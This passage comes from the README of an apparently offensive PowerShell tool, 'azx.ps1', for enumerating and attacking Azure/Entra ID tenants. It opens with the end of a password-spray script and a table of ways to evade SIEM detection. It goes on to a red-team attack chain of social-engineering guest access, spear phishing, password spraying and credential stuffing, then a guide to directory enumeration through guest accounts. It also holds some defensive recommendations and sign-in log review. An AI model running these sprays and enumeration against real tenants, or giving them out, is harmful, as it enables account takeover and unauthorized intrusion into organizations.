Locked Accounts:            $($lockedAccounts.Count)

VALID CREDENTIALS
-------------------------------------------------
$($validCreds | ForEach-Object { "  [+] $($_.Username) - MFA: $($_.MFARequired)" } | Out-String)

RECOMMENDATIONS
-------------------------------------------------
"@

if ($validCreds.Count -gt 0) {
    $report += "  [!] CRITICAL: Valid credentials found!`n"
    $report += "  [*] Next steps:`n"
    $report += "      1. Test accounts without MFA for full access`n"
    $report += "      2. Attempt MFA bypass techniques for MFA-protected accounts`n"
    $report += "      3. Use valid credentials for further enumeration`n"
}

if ($lockedAccounts.Count -gt 0) {
    $report += "`n  [!] WARNING: $($lockedAccounts.Count) accounts locked during spray`n"
    $report += "  [*] Consider longer delays between attempts`n"
}

$report += "`n=================================================`n"

Write-Host $report
$report | Out-File "spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"

Write-Host "`n[+] Report saved to: spray-report-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
```

**Why This Two-Phase Approach is Effective:**

1. **Stealth**: GetCredentialType doesn't trigger authentication logs (Phase 1)
2. **Efficiency**: Only spray against validated usernames (avoid wasted attempts)
3. **Safety**: Reduces account lockout risk by testing fewer invalid usernames
4. **Intelligence**: Separate enumeration from credential testing for better OPSEC
5. **Speed**: Validate 100s of usernames quickly, then spray only valid targets

**Detection Considerations:**

| Activity | Detection Risk | SIEM Alert Likelihood | Mitigation |
|----------|----------------|----------------------|------------|
| GetCredentialType enumeration | 🟢 Low | Low - No auth logs generated | Use residential IP, rate-limit requests |
| ROPC password spray | 🟡 Medium | Medium - Failed auth logs | Slow spray (1 password/day), respect lockout thresholds |
| Multiple password spray rounds | 🔴 High | High - Pattern detection | Long delays between passwords (24+ hours) |
| Account lockouts | 🔴 Critical | Critical - Immediate SOC alert | Test minimal passwords, monitor for lockouts |

### Active Session Enumeration Examples (like nxc smb --qwinsta)

### Example 29-sessions-a: Enumerate All Active Sessions
Query sign-in logs for all users in the last 24 hours:
```powershell
.\azx.ps1 sessions
```

**Output Shows:**
- Recent sign-in events (last 24 hours)
- User principal names and display names
- Success/failure status
- Device information (name, OS, browser)
- IP addresses and geographic locations
- Application accessed
- MFA status
- Risk levels (if Identity Protection is enabled)

### Example 29-sessions-b: Target Specific User
Enumerate sessions for a specific user:
```powershell
.\azx.ps1 sessions -Username alice@targetcorp.com
```

**Use Case**: Track sign-in activity for a compromised or suspicious account.

### Example 29-sessions-c: Export Sessions to CSV
Export all session data for analysis:
```powershell
.\azx.ps1 sessions -ExportPath sessions.csv
```

### Example 29-sessions-d: Export to JSON with Full Details
Export with complete session metadata:
```powershell
.\azx.ps1 sessions -ExportPath sessions.json
```

### Example 29-sessions-e: Query Extended Time Range (7 Days)
Query sign-in events for the last 7 days:
```powershell
.\azx.ps1 sessions -Hours 168
```

**Note**: Free Azure AD retains logs for 7 days, Premium P1/P2 for 30 days.

### Example 29-sessions-f: Query Maximum Time Range (30 Days)
Query sign-in events for the last 30 days (requires Premium license):
```powershell
.\azx.ps1 sessions -Hours 720
```

### Example 29-sessions-g: Targeted Long-Term Investigation
Investigate specific user over extended period:
```powershell
.\azx.ps1 sessions -Username alice@targetcorp.com -Hours 168 -ExportPath alice_7day_activity.csv
```

**Use Case**: Track user activity patterns over a week for incident response or insider threat investigation.

### Example 29-sessions-h: Short-Term Real-Time Monitoring
Query only recent sign-ins (last hour):
```powershell
.\azx.ps1 sessions -Hours 1
```

**Use Case**: Monitor active sessions during an ongoing incident or during a penetration test.

**What Sessions Shows:**

| Information | Description | Security Value |
|------------|-------------|----------------|
| **Timestamp** | When the sign-in occurred | Timeline for incident response |
| **User** | UserPrincipalName | Identify compromised accounts |
| **Status** | Success/Failed | Spot brute force attempts |
| **Device Info** | Name, OS, Browser | Detect unusual devices |
| **IP Address** | Source IP | Geolocation tracking |
| **Location** | City, Country | Detect impossible travel |
| **Application** | App accessed | Identify lateral movement |
| **MFA Status** | Required/Not Required | Find MFA bypass attempts |
| **Risk Level** | Low/Medium/High | Identity Protection alerts |

**Detection Use Cases:**

| Scenario | What to Look For | Command |
|----------|-----------------|---------|
| **Compromised Account** | Multiple failed logins, unusual locations | `.\azx.ps1 sessions -Username target@corp.com` |
| **Insider Threat** | Access to unusual applications, off-hours activity | `.\azx.ps1 sessions` (review all users) |
| **Brute Force Detection** | Many failed login attempts from same IP | `.\azx.ps1 sessions -ExportPath logs.csv` (analyze in Excel) |
| **Impossible Travel** | Sign-ins from different countries within short time | Review location data in exported results |
| **MFA Bypass** | Successful logins without MFA where it should be required | Check MFA status in output |

**Azure Equivalent to qwinsta:**

Traditional `qwinsta` shows who's logged into a Windows machine locally. In Azure/cloud environments, this translates to:
- **Sign-in logs** = Active authentication sessions
- **IP address** = Remote connection source
- **Device info** = Client machine details
- **Application** = What service/resource was accessed

**Time Range Configuration:**
- Default: Last 24 hours (`-Hours 24`)
- Configurable: Use `-Hours` parameter (e.g., `-Hours 168` for 7 days)
- Azure AD log retention:
  - **Free tier**: 7 days (max `-Hours 168`)
  - **Premium P1/P2**: 30 days (max `-Hours 720`)

**Permission Requirements:**
- Requires `AuditLog.Read.All` permission
- Guest users typically cannot access sign-in logs
- Must be authenticated (unlike unauthenticated commands like `users` or `tenant`)

**Common Time Ranges:**
- `-Hours 1` - Last hour (real-time monitoring)
- `-Hours 24` - Last day (default)
- `-Hours 168` - Last week (7 days)
- `-Hours 720` - Last 30 days (requires Premium)

### Vulnerable Target Enumeration Examples (like nxc smb --gen-relay-list)

### Example 29: Basic Vulnerability Enumeration (Auto-Detect Domain)
Enumerate vulnerable targets in your current tenant:
```powershell
.\azx.ps1 vuln-list
```

### Example 30: Target Specific Tenant
Enumerate vulnerabilities for a specific domain:
```powershell
.\azx.ps1 vuln-list -Domain targetcorp.com
```

### Example 31: Export HIGH Risk Targets (Relay-List Style)
Export only HIGH risk findings in a simple format (like nxc --gen-relay-list):
```powershell
.\azx.ps1 vuln-list -ExportPath relay_targets.txt
```

### Example 32: Export Full Vulnerability Report (JSON)
Export all findings with full details:
```powershell
.\azx.ps1 vuln-list -ExportPath vuln_report.json
```

### Example 33: Export to CSV for Spreadsheet Analysis
```powershell
.\azx.ps1 vuln-list -Domain targetcorp.com -ExportPath findings.csv
```

**What vuln-list Checks:**

| Check | Phase | Risk | Description |
|-------|-------|------|-------------|
| Implicit Flow | Unauth | MEDIUM | OAuth implicit flow enabled (token theft risk) |
| ROPC Enabled | Unauth | HIGH | Password spray/brute force possible |
| Legacy Auth Endpoints | Unauth | INFO | Legacy protocols accessible |
| Password-Only SPs | Auth | HIGH | Service principals without certificate auth |
| Public Client Apps | Auth | MEDIUM | Applications allowing ROPC/device code |
| Security Defaults | Auth | MEDIUM | Security Defaults disabled |
| Legacy Auth Blocking | Auth | HIGH | No CA policy blocking legacy auth |
| Stale Guest Accounts | Auth | MEDIUM | Guests with no activity 90+ days |
| Dangerous Permissions | Auth | HIGH | Apps with high-risk API permissions |
| **Guest Permission Level** | Auth | HIGH/MEDIUM | Guests with excessive permissions (null session equivalent) |
| **Users Without MFA** | Auth | HIGH | Users without any MFA method registered |
| Guest Invite Policy | Auth | MEDIUM | Anyone (including guests) can invite external users |

### Example 28: Real-World Red Team Scenario
Complete attack chain using guest enumeration:
```powershell
# PHASE 1: External Recon (No credentials)
.\azx.ps1 tenant -Domain targetcorp.com -ExportPath recon/tenant.json
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath recon/valid-users.csv

# Identify potential guest access opportunities from recon
# Social engineer way into getting invited as "vendor" or "consultant"

# PHASE 2: Guest Enumeration (Low-noise, minimal detection)
.\azx.ps1 hosts -ShowOwners -ExportPath loot/devices.json
.\azx.ps1 groups -ExportPath loot/groups.json
.\azx.ps1 pass-pol -ExportPath loot/policy.json
Get-MgUser -All | Export-Csv loot/all-users.csv

# Analyze results offline:
# - Identify high-value targets (executives, admins)
# - Map device ownership and relationships
# - Find non-compliant or legacy devices
# - Identify privileged accounts

# PHASE 3: Targeted Attack
# Use gathered intelligence for:
# - Spear phishing campaigns
# - Password spraying against high-value accounts
# - Credential stuffing with leaked passwords
# - Exploitation of unpatched devices
```

## 📊 Output Format

The tool provides netexec-style output with the following information:

### Username Enumeration Output

```
AZR         example.com                         443    alice@example.com                  [+] Valid username (Managed)
AZR         example.com                         443    bob@example.com                    [-] Invalid username
AZR         example.com                         443    admin@example.com                  [+] Valid username (Federated)
```

**Color Coding:**
- **Green**: Valid username found (exists in tenant)
- **Dark Gray**: Invalid username (does not exist)
- **Red**: Check failed (network/API error)

**Authentication Types:**
- **Managed**: Standard cloud-managed authentication
- **Federated**: Federated authentication (e.g., ADFS)
- **Alternate**: Alternative authentication method

**Summary Statistics:**
- Total usernames checked
- Valid usernames found
- Invalid usernames
- List of valid usernames with authentication type

### User Profile Enumeration Output

```
AZR         a1b2c3d4e5f6    443    John Smith                             [*] (upn:john.smith@example.com) (job:Senior Engineer) (dept:IT) (type:Member) (status:Enabled) (location:Seattle) (lastSignIn:2025-12-10)
AZR         f6e5d4c3b2a1    443    Jane Doe                               [*] (upn:jane.doe@example.com) (job:Marketing Manager) (dept:Marketing) (type:Member) (status:Enabled) (location:New York) (lastSignIn:2025-12-12)
AZR         1234567890ab    443    External Vendor                        [*] (upn:vendor@partner.com#EXT#@examp...) (job:N/A) (dept:N/A) (type:Guest) (status:Enabled) (location:N/A) (lastSignIn:2025-11-20)
AZR         abcdef123456    443    Test Account                           [*] (upn:test@example.com) (job:N/A) (dept:N/A) (type:Member) (status:Disabled) (location:N/A) (lastSignIn:Never/Unknown)
```

**Color Coding:**
- **Green**: Active member users (enabled accounts)
- **Yellow**: Guest users (external/B2B users)
- **Dark Gray**: Disabled accounts

**User Information Displayed:**
- **UPN**: User Principal Name (email/login)
- **Job**: Job title
- **Dept**: Department
- **Type**: Member (internal) or Guest (external/B2B)
- **Status**: Enabled or Disabled
- **Location**: Office location
- **LastSignIn**: Last sign-in date (requires AuditLog.Read.All permission)

**Summary Statistics:**
- Total users found
- Member users count
- Guest users count
- Enabled accounts count
- Disabled accounts count

### Tenant Discovery Output

```
AZR         example.com                         443    [*] Tenant Discovery

    [+] Tenant ID:                xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    [+] Issuer:                   https://login.microsoftonline.com/{tenant-id}/v2.0
    [+] Authorization Endpoint:   https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize
    [+] Token Endpoint:           https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token
    [+] UserInfo Endpoint:        https://graph.microsoft.com/oidc/userinfo
    [+] End Session Endpoint:     https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/logout
    [+] JWKS URI:                 https://login.microsoftonline.com/{tenant-id}/discovery/v2.0/keys
    [+] Tenant Region Scope:      NA
    [+] Cloud Instance:           microsoftonline.com
    [+] Graph Host:               graph.microsoft.com
    [+] Federation Status:        Managed

    [*] Supported Response Types: code, id_token, token, id_token token
    [*] Supported Scopes:         openid, profile, email, offline_access
    [*] Supported Claims:         45 claims available

[*] Enumerating exposed applications and configurations...
    [!] Implicit flow enabled (security consideration)

    [*] Supported Grant Types:
        - authorization_code
        - refresh_token
        - client_credentials
          [!] Note: client_credentials grant type enabled

[*] Probing for exposed application information...
    [+] Accessible endpoint: https://graph.microsoft.com/.well-known/openid-configuration

[*] Security Findings:
    [!] Potential Misconfigurations: 1
        - Implicit flow enabled (potential security risk)
```

**Information Retrieved:**
- **Basic Configuration**:
  - Tenant ID (GUID)
  - Authentication and authorization endpoints
  - Token endpoints
  - JWKS URI for token validation
  - Tenant region and cloud instance
  - Federation status (Managed vs Federated)
  - Supported response types, scopes, and claims

- **Security Enumeration** (mimics `nxc smb --enum`):
  - Exposed application IDs and client configurations
  - Publicly accessible redirect URIs
  - OAuth/OIDC misconfigurations and security risks
  - Enabled grant types and their security implications
  - Accessible federation metadata
  - Implicit flow detection (potential XSS/token leakage risks)
  - Risky grant types (password grants, client credentials)

**Color Coding:**
- **Green**: Secure configurations or successfully retrieved information
- **Yellow**: Security considerations, warnings, or potential misconfigurations
- **Cyan**: Standard information and metadata
- **Dark Gray**: Additional technical details

### Device Enumeration Output

```
AZR         <DeviceID>       443    <DeviceName>                          [*] <OS> <Version> (name:<FullName>) (trust:<Type>) (compliant:<True/False>) (enabled:<True/False>) (owner:<Owner>)
```

**Color Coding:**
- **Cyan**: Normal, enabled, compliant devices
- **Yellow**: Non-compliant devices
- **Dark Gray**: Disabled devices

**Summary Statistics:**
- Total devices found
- Windows devices count
- Azure AD joined devices count
- Hybrid joined devices count
- Compliant devices count
- Enabled devices count

### Group Enumeration Output (mimics `nxc smb --groups`)

```
AZR         <GroupID>        443    <GroupName>                           [*] (name:<FullName>) (type:<GroupTypes>) (security:<True/False>) (mail:<True/False>) (members:<Count>) (desc:<Description>)
```

**Example:**
```
AZR         a1b2c3d4e5f6    443    IT Administrators                      [*] (name:IT Administrators) (type:Security) (security:True) (mail:False) (members:15) (desc:IT department admins)
AZR         f6e5d4c3b2a1    443    Marketing Team                         [*] (name:Marketing Team) (type:Unified) (security:False) (mail:True) (members:42) (desc:Marketing department)
```

**Color Coding:**
- **Green**: Security groups (SecurityEnabled = True)
- **Yellow**: Mail-enabled groups
- **Cyan**: Other group types

**Group Types:**
- **Security**: Security groups (used for access control)
- **Unified**: Microsoft 365 groups
- **DynamicMembership**: Dynamic groups with automatic membership
- **Distribution**: Distribution lists (mail-enabled)

**Summary Statistics:**
- Total groups found
- Security groups count
- Mail-enabled groups count
- Microsoft 365 groups count
- Dynamic groups count

### Password Policy Output (mimics `nxc smb --pass-pol`)

```
AZR         <TenantName>                         443    [*] Password Policy Information

    [+] Password Validity Period:     90 days
    [+] Password Notification Window: 14 days
    [+] Verified Domains:             2 domain(s)
        - contoso.com (Default)
        - contoso.onmicrosoft.com (Initial)
    [+] Technical Notification Emails: 1
        - admin@contoso.com

    [*] MFA Registration Campaign:
        State: enabled
        Snooze Duration: 14 days

    [*] Enabled Authentication Methods:
        [+] Microsoft Authenticator (Enabled)
        [+] SMS (Enabled)
        [+] FIDO2 Security Key (Enabled)

[+] Security Defaults: ENABLED
    [*] This enforces MFA for administrators and users when needed

[+] Found 5 Conditional Access Policies

    [ENABLED] Require MFA for Admins
        [+] Requires MFA
        Scope: All Applications
    [ENABLED] Block Legacy Authentication
        Scope: All Applications
    [REPORT-ONLY] Require Compliant Device
        Scope: All Applications

    [*] CA Policy Summary:
        Enabled: 3
        Report-Only: 1
        Disabled: 1
```

**Color Coding:**
- **Green**: Good security posture (Security Defaults enabled, policies enforced, MFA required)
- **Yellow**: Security considerations (Security Defaults disabled, report-only policies)
- **Cyan**: Informational (policy details, settings)
- **Dark Gray**: Technical details (authentication methods, domains)

**Information Retrieved:**
- **Password Policies**: Expiration periods, notification windows
- **Domain Configuration**: Verified domains, default domains
- **Authentication Methods**: Enabled MFA methods (Authenticator, SMS, FIDO2, etc.)
- **Security Defaults**: Whether baseline security is enabled
- **Conditional Access Policies**: Policies enforcing MFA, device compliance, location restrictions
- **Technical Contacts**: Admin and security notification emails

### Guest Login Enumeration Output (mimics `nxc smb -u 'a' -p ''`)

```
[*] AZX - Azure/Entra Guest Login Enumeration
[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')
[*] Target Domain: targetcorp.com
[*] Method: ROPC Authentication Testing

[*] Phase 1: Checking tenant guest configuration (unauthenticated)...
AZR         targetcorp.com                      443    [+] Tenant exists
AZR         targetcorp.com                      443    [*] NameSpaceType: Managed
AZR         targetcorp.com                      443    [*] Federation: Managed (Cloud-only)
AZR         targetcorp.com                      443    [+] External/Guest users: Likely ENABLED (B2B)

[*] Phase 2: Testing guest authentication...
AZR         targetcorp.com                      443    alice@targetcorp.com                   [+] Valid credentials - MFA REQUIRED
AZR         targetcorp.com                      443    bob@targetcorp.com                     [-] Invalid credentials
AZR         targetcorp.com                      443    admin@targetcorp.com                   [!] ACCOUNT LOCKED
AZR         targetcorp.com                      443    test@targetcorp.com                    [!] PASSWORD EXPIRED (valid user)
AZR         targetcorp.com                      443    service@targetcorp.com                 [+] SUCCESS! Got access token (password)

[*] Authentication Test Summary:
    Total Tested:    5
    Valid Creds:     3
    MFA Required:    1
    Accounts Locked: 1
```

**Color Coding:**
- **Green**: Valid credentials (with or without MFA requirement)
- **Yellow**: Valid user but blocked (MFA required, password expired, account locked)
- **Dark Gray**: Invalid credentials or user not found
- **Red**: Check failed (network/API error)

**Authentication Result Codes:**
- `[+] SUCCESS! Got access token` - Valid credentials, authentication successful
- `[+] Valid credentials - MFA REQUIRED` - Credentials are valid but MFA is required (good for password spray)
- `[+] Valid credentials - CONSENT REQUIRED` - Credentials valid, app consent needed
- `[!] ACCOUNT LOCKED` - Too many failed attempts, account is locked
- `[!] PASSWORD EXPIRED (valid user)` - Password expired but user exists
- `[-] Invalid credentials` - Wrong username or password
- `[-] User not found` - Username does not exist in tenant
- `[-] Account disabled` - Account exists but is disabled
- `[!] ROPC disabled` - ROPC flow is disabled (try device code flow)

**Phase 1 Information (Unauthenticated):**
- **Tenant Exists**: Whether the domain is a valid Azure tenant
- **NameSpaceType**: Managed (cloud-only) or Federated (on-premises)
- **Federation Status**: Authentication method (cloud, ADFS, etc.)
- **B2B Status**: Whether external/guest users are likely accepted

**Phase 2 Information (Authentication Testing):**
- Per-user authentication test results
- MFA detection (valid creds even if MFA blocks)
- Account lockout detection
- Password expiration detection

### Active Session Enumeration Output (mimics `nxc smb --qwinsta`)

```
[*] AZX - Azure/Entra Active Session Enumeration
[*] Command: Sessions (Similar to: nxc smb --qwinsta)
[*] Querying sign-in logs for last 24 hours...

[+] Authenticated as: admin@targetcorp.com

[*] ========================================
[*] ACTIVE SIGN-IN SESSIONS
[*] ========================================

[*] Querying Azure AD sign-in logs (this may take a moment)...
[+] Found 47 sign-in events

AZR          alice@targetcorp.com                      203.0.113.45   [+] SUCCESS
    Time:      2024-12-14 08:23:15
    Device:    ALICE-LAPTOP (Windows 11)
    App:       Microsoft Teams
    Location:  Seattle, United States
    MFA:       Required

AZR          bob@targetcorp.com                        198.51.100.12  [+] SUCCESS
    Time:      2024-12-14 08:15:42
    Device:    BOB-DESKTOP (Windows 10)
    App:       Office 365 Exchange Online
    Location:  New York, United States

AZR          charlie@targetcorp.com                    192.0.2.100    [!] FAILED
    Time:      2024-12-14 07:58:30
    Device:    Unknown Device (Linux)
    App:       Azure Portal
    Location:  Moscow, Russia
    Risk:      HIGH
    Error:     Invalid username or password

AZR          alice@targetcorp.com                      203.0.113.45   [+] SUCCESS
    Time:      2024-12-14 07:45:12
    Device:    ALICE-LAPTOP (Windows 11)
    App:       SharePoint Online
    Location:  Seattle, United States
    MFA:       Required

[*] ========================================
[*] SESSION SUMMARY
[*] ========================================

AZR          Total Sign-ins:      47
AZR          Unique Users:        15
AZR          Successful:          42
AZR          Failed:              5
AZR          MFA Protected:       38
AZR          Risky Sign-ins:      2

[*] Top Active Users:
    alice@targetcorp.com: 8 sign-ins
    bob@targetcorp.com: 6 sign-ins
    carol@targetcorp.com: 4 sign-ins
    dave@targetcorp.com: 3 sign-ins
    eve@targetcorp.com: 3 sign-ins

[*] Top Applications:
    Microsoft Teams: 12 sign-ins
    Office 365 Exchange Online: 10 sign-ins
    SharePoint Online: 8 sign-ins
    Azure Portal: 5 sign-ins
    Microsoft Graph: 4 sign-ins

[*] Session enumeration complete!
```

**Key Information Displayed:**
- **Timestamp**: Local time when sign-in occurred
- **User**: UserPrincipalName (email/username)
- **Status**: SUCCESS (green) or FAILED (red)
- **IP Address**: Source IP of the connection
- **Device**: Device name and operating system
- **Application**: Which app/service was accessed
- **Location**: Geographic location (city, country)
- **MFA Status**: Whether MFA was required
- **Risk Level**: HIGH/MEDIUM/LOW (if Identity Protection detects risk)
- **Error Details**: Failure reason for unsuccessful sign-ins

**Summary Statistics:**
- Total sign-in events found
- Number of unique users
- Success vs failure counts
- MFA-protected session count
- Risky sign-in count
- Top 5 most active users
- Top 5 most accessed applications

### Vulnerable Target Enumeration Output (mimics `nxc smb --gen-relay-list`)

```
[*] AZX - Vulnerable Target Enumeration
[*] Command: Vuln-List (Azure Relay Target Equivalent)
[*] Similar to: nxc smb 192.168.1.0/24 --gen-relay-list

[*] PHASE 1: Unauthenticated Enumeration
[*] ========================================

[+] Using auto-detected domain: targetcorp.com

[*] Checking tenant configuration for: targetcorp.com
    [+] Tenant ID: 12345678-1234-1234-1234-123456789abc
    [!] IMPLICIT FLOW ENABLED - Token theft risk

[*] Testing guest/external authentication...
    [!] ROPC ENABLED - Password spray/brute force possible

[*] Checking legacy authentication endpoints...
    [*] Exchange ActiveSync endpoint accessible
    [*] Autodiscover endpoint accessible (requires auth)

[*] PHASE 2: Authenticated Enumeration
[*] ========================================

[+] Using existing Graph connection: user@targetcorp.com

[*] Enumerating Service Principals with password credentials...
    (Like SMB hosts without signing - weaker authentication)
    [!] Legacy App Service
        AppId: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
    [!] API Integration [EXPIRING SOON]
        AppId: 11111111-2222-3333-4444-555555555555

    [*] Total password-only service principals: 12

[*] Enumerating applications with public client flows enabled...
    (Allows ROPC - direct username/password authentication)
    [!] Mobile App [MEDIUM]
        AppId: 99999999-8888-7777-6666-555555555555 | Audience: AzureADMultipleOrgs
    [!] Desktop Client [HIGH]
        AppId: 00000000-1111-2222-3333-444444444444 | Audience: AzureADMyOrg

    [*] Total public client applications: 5

[*] Checking Security Defaults and Conditional Access...
    [!] SECURITY DEFAULTS DISABLED
        Check if Conditional Access provides equivalent protection
    [!] LEGACY AUTH NOT BLOCKED - MFA bypass possible
    [*] Found 8 Conditional Access policies

[*] Enumerating guest users...
    (External users = potential 'null session' equivalent)
    [*] Total guest users: 47
    [*] Active guests (90 days): 23
    [!] Stale guests (no activity 90+ days): 24

[*] Checking for applications with dangerous API permissions...
    [!] Third-Party Sync App
        Permissions: Mail.ReadWrite, Mail.Send
    [!] Backup Solution
        Permissions: Files.ReadWrite.All, Sites.ReadWrite.All

    [*] Total apps with dangerous permissions: 3

[*] Checking guest user permission level...
    (Determines what guests can enumerate - the 'null session' equivalent)
    [!] CRITICAL: Guest access = SAME AS MEMBER USERS
        Guests can enumerate entire directory (null session equivalent)
    [!] Guest invites: ANYONE can invite (including guests)

[*] Checking for users without MFA methods registered...
    (Users vulnerable to credential stuffing/phishing)
    [!] Users WITHOUT MFA: 23
        - John Smith
        - Jane Doe [ADMIN]
        - Bob Wilson
        - Alice Johnson
        - Test Account
        ... and 18 more
    [!] CRITICAL: 2 ADMIN(S) without MFA!
    [*] Total checked: 150 | With MFA: 127 | Without: 23

[*] ========================================
[*] VULNERABILITY SUMMARY
[*] ========================================

AZR         targetcorp.com                      443    [*] Vuln-List Results

    [!] HIGH RISK findings:   12
    [!] MEDIUM RISK findings: 10
    [*] Total findings:       22

[+] Full results exported to: vuln_report.json

[*] RECOMMENDATIONS:
    [!] Address HIGH risk findings immediately:
        - Replace password credentials with certificates for service principals
        - Block legacy authentication via Conditional Access
        - Review and minimize dangerous API permissions
        - Restrict guest user permissions to "Most restricted"
        - Enforce MFA registration for all users (especially admins!)
    [*] Review MEDIUM risk findings:
        - Audit public client applications
        - Clean up stale guest accounts
        - Enable Security Defaults or equivalent CA policies
        - Restrict guest invite permissions

[*] Vuln-list enumeration complete!
```

**Color Coding:**
- **Red**: HIGH risk findings (immediate action required)
- **Yellow**: MEDIUM risk findings (should be reviewed)
- **Green**: Passed checks or good security posture
- **Dark Gray**: Informational findings

**Phase 1 (Unauthenticated) Checks:**
- Tenant configuration (implicit flow, ROPC status)
- Legacy authentication endpoint accessibility
- Guest/external authentication acceptance

**Phase 2 (Authenticated) Checks:**
- Service principals with password-only credentials (no certificate auth)
- Applications with public client flows (ROPC vulnerable)
- Security Defaults and Conditional Access gaps
- Legacy authentication blocking policies
- Guest user enumeration and stale accounts
- Dangerous OAuth permission grants
- **Guest permission level** (null session vulnerability)
- **Users without MFA registered** (credential attack targets)
- Guest invite policy configuration

**Export Formats:**
- `.txt` - Simple relay-list style (HIGH risk only): `Type,Target,Vulnerability`
- `.json` - Full findings with all metadata
- `.csv` - Spreadsheet-friendly format

## 🔍 Interpreting Security Findings

### Tenant Discovery Security Assessment

When running `.\azx.ps1 tenant`, the tool performs security-focused enumeration similar to `nxc smb --enum` and may identify the following:

#### Exposed Application IDs
- **What**: Publicly accessible application/client IDs in the tenant configuration
- **Risk**: These IDs can be used to craft targeted phishing attacks or test for misconfigured application permissions
- **Severity**: Low to Medium (depends on application configuration)

#### Exposed Redirect URIs
- **What**: OAuth redirect URIs that are publicly visible
- **Risk**: Can reveal internal application URLs, development endpoints, or misconfigured redirect targets
- **Severity**: Medium (may expose internal infrastructure or enable redirect attacks)

#### Implicit Flow Enabled
- **What**: The OAuth implicit flow is supported (returns tokens in URL fragments)
- **Risk**: Tokens in URLs can be logged, leaked via referrer headers, or stolen via XSS
- **Recommendation**: Modern applications should use Authorization Code flow with PKCE
- **Severity**: Medium (security consideration for modern apps)

#### Risky Grant Types

**Password Grant (Resource Owner Password Credentials)**:
- **What**: Allows applications to collect user passwords directly
- **Risk**: Defeats MFA, password policies, and creates credential theft opportunities
- **Recommendation**: Should only be used for legacy systems during migration
- **Severity**: High

**Client Credentials Grant**:
- **What**: Application-only authentication without user context
- **Risk**: If client secret is compromised, attackers gain application-level access
- **Recommendation**: Use certificate-based authentication and rotate secrets regularly
- **Severity**: Medium (requires proper secret management)

#### Accessible Federation Metadata
- **What**: Publicly accessible federation configuration XML
- **Risk**: Reveals federation partners, entity IDs, and authentication endpoints
- **Severity**: Low (informational for reconnaissance)

### When to Be Concerned

🔴 **High Priority**:
- Password grant type enabled
- Redirect URIs pointing to non-HTTPS endpoints
- Wildcard redirect URIs (e.g., `https://*.example.com/*`)

🟡 **Medium Priority**:
- Implicit flow enabled for new applications
- Client credentials without proper rotation
- Exposed internal application URLs

🟢 **Low Priority / Informational**:
- Federation metadata available (expected for federated tenants)
- Standard OpenID configuration exposure (normal)
- Common grant types like authorization_code

## 🔓 Guest User Enumeration - The Azure "Null Session"

> **⚠️ CRITICAL SECURITY FINDING**: This is one of the most underestimated attack vectors in Azure/Entra ID. Most organizations are vulnerable and don't even know it.

### Understanding the Azure Null Session Equivalent

**Critical Security Finding**: Guest users in Azure/Entra ID represent the modern equivalent of SMB null sessions - a low-privileged account that can often enumerate significant directory information due to misconfigured default permissions.

**TL;DR for Pentesters:**
- Get invited as a guest (or compromise a vendor/partner account)
- Run `.\azx.ps1 hosts` with guest credentials
- Enumerate entire directory with minimal detection
- Profit 💰

### The Attack Vector

In classic on-premises Active Directory penetration testing, attackers would use **null session** (anonymous) connections to enumerate users, groups, and shares via SMB. In Azure/Entra ID, **guest accounts** serve a similar purpose:

```
Traditional Attack:        Modern Azure Equivalent:
┌─────────────────┐       ┌──────────────────────┐
│  SMB Null       │       │  Guest User Account  │
│  Session        │  ───> │  (External B2B)      │
│  (Anonymous)    │       │                      │
└─────────────────┘       └──────────────────────┘
         ↓                            ↓
    Enumerate:                   Enumerate:
    - Users                      - Users
    - Groups                     - Groups
    - Shares                     - Devices
    - Computers                  - Applications
                                 - Service Principals
```

### Access Level Comparison

| Access Level | Authentication Required | Enumeration Capabilities | Detection Risk | Use Case |
|-------------|------------------------|-------------------------|----------------|----------|
| **No Authentication** | ❌ None | Tenant config, username validation, federation metadata | 🟢 **None** | Initial reconnaissance |
| **Guest User** | ✅ Guest credentials | Users, groups, devices, some apps (if not restricted) | 🟡 **Low** | **"Null session"** - Primary enumeration method |
| **Member User** | ✅ Member credentials | Full directory, all devices, groups, apps, policies | 🔴 **High** | Post-compromise enumeration |
| **Global Admin** | ✅ Admin credentials | Everything including security settings, CA policies | 🔴 **Critical** | Full tenant control |

**Key Takeaway**: Guest user access provides **80% of the information** with **20% of the risk** - making it the optimal reconnaissance method.

### Why This Works

**Default Azure/Entra ID Guest Permissions:**
When external collaboration is enabled (which it is in most organizations), guest users receive the following default permissions:

1. **User.Read.All** - Read all users' basic profiles
2. **Group.Read.All** - Read all group information
3. **Device.Read.All** - Read all device information (often enabled)
4. **Directory.Read.All** - Read directory data (depending on configuration)

**The Problem:**
- Most organizations enable external collaboration for business needs (partners, vendors, contractors)
- Default guest permissions are often **NOT** restricted
- Organizations don't realize guests can enumerate the entire directory
- Guest access generates **minimal logs and alerts** compared to compromised member accounts
- This is a **low-noise reconnaissance technique** perfect for initial access scenarios

### Testing for Guest Enumeration Vulnerability

#### Step 1: Check if the Organization Has Guest Users

```powershell
# Enumerate from outside (no authentication required)
.\azx.ps1 tenant -Domain target.com

# Look for:
# - External collaboration enabled
# - B2B integration settings
# - Guest user access restrictions
```

#### Step 2: Obtain Guest Access (Red Team Scenarios)

Common methods to obtain guest credentials:
1. **Social Engineering**: Request access as a "vendor" or "partner"
2. **Compromised Partner**: Use credentials from a compromised partner organization
3. **Open Registrations**: Some orgs have self-service guest registration
4. **Leaked Credentials**: Guest accounts in breach databases
5. **Business Email**: Create legitimate business relationship requiring collaboration

#### Step 3: Enumerate as Guest User

Once you have guest credentials (e.g., `external-user@partner.com`):

```powershell
# Connect as guest user
Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Device.Read.All"
# (Login with guest credentials when prompted)

# Enumerate all users in the target tenant
.\azx.ps1 hosts -Scopes "User.Read.All,Device.Read.All"

# Check what you can access with the new commands
.\azx.ps1 hosts
.\azx.ps1 groups
.\azx.ps1 pass-pol

# Or use Graph API directly
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName, JobTitle, Department
Get-MgGroup -All | Select-Object DisplayName, Description
Get-MgDevice -All | Select-Object DisplayName, OperatingSystem
```

